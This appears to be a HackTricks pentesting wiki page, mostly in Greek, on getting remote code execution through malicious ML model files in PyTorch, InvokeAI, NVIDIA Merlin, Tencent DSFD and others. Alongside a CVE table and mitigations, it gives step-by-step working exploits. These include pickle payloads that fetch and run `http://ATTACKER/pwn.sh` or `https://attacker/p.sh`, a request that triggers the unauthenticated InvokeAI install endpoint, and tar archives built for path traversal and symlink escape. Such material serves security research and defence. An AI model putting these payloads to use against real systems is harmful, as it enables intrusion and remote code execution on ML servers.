# RCE μοντέλων

{{#include ../banners/hacktricks-training.md}}

## Φόρτωση μοντέλων για RCE

Τα Machine Learning μοντέλα συνήθως διαμοιράζονται σε διάφορες μορφές, όπως ONNX, TensorFlow, PyTorch, κ.λπ. Αυτά τα μοντέλα μπορούν να φορτωθούν σε μηχανές προγραμματιστών ή σε παραγωγικά συστήματα για χρήση. Συνήθως τα μοντέλα δεν πρέπει να περιέχουν κακόβουλο κώδικα, αλλά υπάρχουν περιπτώσεις όπου το μοντέλο μπορεί να χρησιμοποιηθεί για εκτέλεση αυθαίρετου κώδικα στο σύστημα ως επιθυμητή λειτουργία ή λόγω ευπάθειας στη βιβλιοθήκη φόρτωσης μοντέλων.

Τη στιγμή της συγγραφής, μερικά παραδείγματα αυτού του τύπου ευπαθειών είναι:

| **Πλαίσιο / Εργαλείο**        | **Ευπάθεια (CVE αν υπάρχει)**                                                    | **Δίαυλος RCE**                                                                                                                           | **Αναφορές**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Ανεπαρκής αποσειριοποίηση στο* `torch.load` **(CVE-2025-32434)**                                                              | Κακόβουλο pickle σε checkpoint μοντέλου οδηγεί σε εκτέλεση κώδικα (παρακάμπτοντας τον μηχανισμό `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + λήψη κακόβουλου μοντέλου προκαλεί εκτέλεση κώδικα · Java αποσειριοποίηση που οδηγεί σε RCE στο API διαχείρισης                                        | |
| **NVIDIA Merlin Transformers4Rec** | Μη ασφαλής αποσειριοποίηση checkpoint μέσω `torch.load` **(CVE-2025-23298)**                                           | Ανεπαληθεύσιμο checkpoint ενεργοποιεί pickle reducer κατά τη φόρτωση `load_model_trainer_states_from_checkpoint` → εκτέλεση κώδικα στον ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Η φόρτωση μοντέλου από YAML χρησιμοποιεί `yaml.unsafe_load` (εκτέλεση κώδικα) <br> Φόρτωση μοντέλου με **Lambda** layer εκτελεί αυθαίρετο κώδικα Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Κατασκευασμένο `.tflite` μοντέλο προκαλεί integer overflow → heap corruption (ενδεχόμενο RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Η φόρτωση μοντέλου μέσω `joblib.load` εκτελεί pickle με το payload `__reduce__` του επιτιθέμενου                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | Το `numpy.load` κατά προεπιλογή επέτρεπε pickled object arrays – κακόβουλο `.npy/.npz` ενεργοποιεί εκτέλεση κώδικα                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Η εξωτερική διαδρομή weights του ONNX μοντέλου μπορεί να διαφύγει από το directory (ανάγνωση αυθαίρετων αρχείων) <br> Κακόβουλο tar ONNX μοντέλου μπορεί να αντικαταστήσει αυθαίρετα αρχεία (οδηγώντας σε RCE) | |
| ONNX Runtime (design risk)  | *(Δεν υπάρχει CVE)* ONNX custom ops / control flow                                                                                    | Μοντέλο με custom operator απαιτεί φόρτωση native κώδικα του επιτιθέμενου · πολύπλοκα γραφήματα μοντέλου μπορούν να καταχραστούν τη λογική για εκτέλεση μη προοριζόμενων υπολογισμών   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Η χρήση του model-load API με `--model-control` ενεργοποιημένο επιτρέπει σχετική path traversal για εγγραφή αρχείων (π.χ. αντικατάσταση `.bashrc` για RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Ελαττωματικό αρχείο μοντέλου GGUF προκαλεί heap buffer overflows στον parser, επιτρέποντας εκτέλεση αυθαίρετου κώδικα στο σύστημα του θύματος                     | |
| **Keras (older formats)**   | *(Δεν υπάρχει νέο CVE)* Legacy Keras H5 model                                                                                         | Κακόβουλο HDF5 (`.h5`) μοντέλο με κώδικα σε layer Lambda εξακολουθεί να εκτελείται κατά τη φόρτωση (το Keras safe_mode δεν καλύπτει τον παλιό format – “downgrade attack”) | |
| **Others** (general)        | *Σχεδιαστικό σφάλμα* – Pickle serialization                                                                                         | Πολλά εργαλεία ML (π.χ., μορφές μοντέλων βασισμένες σε pickle, Python `pickle.load`) θα εκτελέσουν αυθαίρετο κώδικα ενσωματωμένο σε αρχεία μοντέλων εκτός αν αντιμετωπιστεί | |

Επιπλέον, υπάρχουν ορισμένα μοντέλα βασισμένα σε Python pickle, όπως αυτά που χρησιμοποιούνται από [PyTorch](https://github.com/pytorch/pytorch/security), που μπορούν να χρησιμοποιηθούν για εκτέλεση αυθαίρετου κώδικα στο σύστημα εάν δεν φορτωθούν με `weights_only=True`. Επομένως, οποιοδήποτε μοντέλο βασισμένο σε pickle μπορεί να είναι ιδιαίτερα ευάλωτο σε αυτόν τον τύπο επιθέσεων, ακόμη και αν δεν αναφέρεται στον παραπάνω πίνακα.

### 🆕  InvokeAI RCE μέσω `torch.load` (CVE-2024-12029)

`InvokeAI` είναι μια δημοφιλής open-source web διεπαφή για το Stable-Diffusion. Οι εκδόσεις **5.3.1 – 5.4.2** εκθέτουν το REST endpoint `/api/v2/models/install` που επιτρέπει στους χρήστες να κατεβάζουν και να φορτώνουν μοντέλα από αυθαίρετα URLs.

Εσωτερικά το endpoint τελικά καλεί:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Όταν το αρχείο που παρέχεται είναι ένα **PyTorch checkpoint (`*.ckpt`)**, το `torch.load` εκτελεί **pickle deserialization**. Επειδή το περιεχόμενο προέρχεται απευθείας από το user-controlled URL, ένας attacker μπορεί να ενσωματώσει ένα κακόβουλο αντικείμενο με custom `__reduce__` μέθοδο μέσα στο checkpoint· η μέθοδος εκτελείται **during deserialization**, οδηγώντας σε **remote code execution (RCE)** στον InvokeAI server.

Η ευπάθεια καταχωρήθηκε ως **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Create a malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Φιλοξενήστε το `payload.ckpt` σε ένα HTTP server που ελέγχετε (π.χ. `http://ATTACKER/payload.ckpt`).
3. Προκαλέστε το ευάλωτο endpoint (no authentication required):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Όταν το InvokeAI κατεβάζει το αρχείο καλεί `torch.load()` → το gadget `os.system` τρέχει και ο attacker αποκτά code execution στο πλαίσιο της διαδικασίας InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` αυτοματοποιεί όλη τη ροή.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` προσβάσιμο στον attacker  
•  Η διαδικασία έχει δικαιώματα για εκτέλεση shell εντολών

#### Mitigations

* Αναβαθμίστε σε **InvokeAI ≥ 5.4.3** – το patch θέτει `scan=True` ως προεπιλογή και πραγματοποιεί malware scanning πριν από την αποσειριοποίηση.  
* Κατά τη φόρτωση checkpoints προγραμματιστικά χρησιμοποιήστε `torch.load(file, weights_only=True)` ή το νέο helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Επιβάλετε allow-lists / signatures για τις πηγές μοντέλων και τρέξτε την υπηρεσία με least-privilege.

> ⚠️ Να θυμάστε ότι **κάθε** Python pickle-based format (συμπεριλαμβανομένων πολλών `.pt`, `.pkl`, `.ckpt`, `.pth` αρχείων) είναι εγγενώς μη ασφαλές για αποσειριοποίηση από μη αξιόπιστες πηγές.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE μέσω μη ασφαλούς `torch.load` (CVE-2025-23298)

Η Transformers4Rec της NVIDIA (μέρος του Merlin) αποκάλυψε έναν μη ασφαλή φορτωτή checkpoint που καλούσε απευθείας το `torch.load()` σε μονοπάτια που παρείχε ο χρήστης. Επειδή το `torch.load` βασίζεται στο Python `pickle`, ένα checkpoint ελεγχόμενο από επιτιθέμενο μπορεί να εκτελέσει αυθαίρετο κώδικα μέσω ενός reducer κατά τη διάρκεια της απο-σειριοποίησης.

Ευάλωτη διαδρομή (πριν το fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Γιατί αυτό οδηγεί σε RCE: Στο Python `pickle`, ένα αντικείμενο μπορεί να ορίσει έναν reducer (`__reduce__`/`__setstate__`) που επιστρέφει ένα callable και επιχειρήματα. Το callable εκτελείται κατά τη διαδικασία unpickling. Αν τέτοιο αντικείμενο υπάρχει σε ένα checkpoint, τρέχει πριν χρησιμοποιηθούν οποιαδήποτε weights.

Ελάχιστο παράδειγμα κακόβουλου checkpoint:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Μηχανισμοί παράδοσης και ακτίνα επίπτωσης:
- Trojanized checkpoints/models που κοινοποιούνται μέσω repos, buckets, ή artifact registries
- Αυτοματοποιημένα resume/deploy pipelines που αυτο-φορτώνουν checkpoints
- Η εκτέλεση γίνεται εντός training/inference workers, συχνά με αυξημένα δικαιώματα (π.χ., root σε containers)

Διόρθωση: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) αντικατέστησε την άμεση `torch.load()` με έναν περιορισμένο, allow-listed deserializer που υλοποιείται στο `transformers4rec/utils/serialization.py`. Ο νέος loader επικυρώνει types/fields και αποτρέπει την κλήση αυθαίρετων callables κατά τη φόρτωση.

Αμυντικές οδηγίες ειδικά για PyTorch checkpoints:
- Μην κάνετε unpickle σε μη αξιόπιστα δεδομένα. Προτιμήστε μη-εκτελέσιμα φορμά όπως [Safetensors](https://huggingface.co/docs/safetensors/index) ή ONNX όπου είναι δυνατό.
- Αν πρέπει να χρησιμοποιήσετε PyTorch serialization, διασφαλίστε `weights_only=True` (υποστηρίζεται σε νεότερο PyTorch) ή χρησιμοποιήστε έναν προσαρμοσμένο allow-listed unpickler παρόμοιο με το patch του Transformers4Rec.
- Επιβάλλετε model provenance/signatures και sandbox deserialization (seccomp/AppArmor; non-root user; περιορισμένο FS και no network egress).
- Παρακολουθείτε για απροσδόκητες child processes από ML services κατά το χρόνο φόρτωσης checkpoint· εντοπίστε τη χρήση `torch.load()`/`pickle`.

POC και αναφορές ευπαθειών/patch:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Παράδειγμα – δημιουργία ενός κακόβουλου PyTorch model

- Δημιουργήστε το model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Φόρτωση του μοντέλου:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Το Tencent’s FaceDetection-DSFD εκθέτει ένα `resnet` endpoint που deserializes user-controlled data. Το ZDI επιβεβαίωσε ότι ένας remote attacker μπορεί να εξαναγκάσει ένα victim να φορτώσει μια malicious page/file, να την έχει να push ένα crafted serialized blob σε εκείνο το endpoint, και να προκαλέσει deserialization ως `root`, οδηγώντας σε full compromise.

Το exploit flow mirrors typical pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Οποιοδήποτε gadget προσβάσιμο κατά τη διάρκεια της deserialization (constructors, `__setstate__`, framework callbacks, κ.λπ.) μπορεί να οπλοποιηθεί με τον ίδιο τρόπο, ανεξάρτητα από το αν το transport ήταν HTTP, WebSocket, ή ένα αρχείο που τοποθετήθηκε σε έναν παρακολουθούμενο κατάλογο.


## Μοντέλα για Path Traversal

Όπως σχολιάζεται στο [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), οι περισσότερες μορφές μοντέλων που χρησιμοποιούνται από διάφορα AI frameworks βασίζονται σε αρχεία αρχειοθέτησης, συνήθως `.zip`. Επομένως, μπορεί να είναι δυνατό να καταχραστεί κανείς αυτές τις μορφές για να εκτελέσει path traversal attacks, επιτρέποντας την ανάγνωση αυθαίρετων αρχείων από το σύστημα όπου φορτώνεται το μοντέλο.

Για παράδειγμα, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργήσει ένα αρχείο στον κατάλογο `/tmp` όταν φορτωθεί:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ή, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργήσει ένα symlink προς τον κατάλογο `/tmp` όταν φορτωθεί:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Βαθιά ανάλυση: Keras .keras deserialization and gadget hunting

Για έναν στοχευμένο οδηγό για τα .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, και post-fix gadget discovery μέσα στην allowlist, δείτε:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Αναφορές

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
